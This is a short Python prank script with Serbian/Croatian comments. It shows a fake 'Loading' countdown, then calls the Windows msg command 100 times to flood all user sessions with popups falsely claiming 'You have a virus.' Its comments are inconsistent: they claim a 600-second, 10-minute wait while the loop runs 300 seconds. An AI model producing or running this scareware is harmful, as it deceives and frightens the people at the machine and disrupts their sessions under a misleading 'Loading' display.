import subprocess
import time
def odbrojavanje():
    for i in range(300, 0, -1):  # Odbrojavanje od 600 sekundi (10 minuta)
        minutes = i // 60
        seconds = i % 60
        # Tokom odbrojavanja samo prikazujemo broj
        print(f"Loading   {minutes:02}:{seconds:02}")
        time.sleep(1)  # Pauza od 1 sekunde između odbrojavanja
def pokreni_windows_error():
    # Pokreće Windows grešku koristeći `msg` komandu
    # Ova komanda će otvoriti prozor sa porukom o grešci
    subprocess.Popen(['msg', '*', 'You have a virus.'])

def pokreni_windows_errors():
    # Pokreće Windows greške 100 puta
    for _ in range(100):
        pokreni_windows_error()  # Pokreće grešku

# Prvo odbrojavamo 10 minuta
odbrojavanje()

# Nakon 10 minuta, pokrećemo Windows greške 100 puta
pokreni_windows_errors()
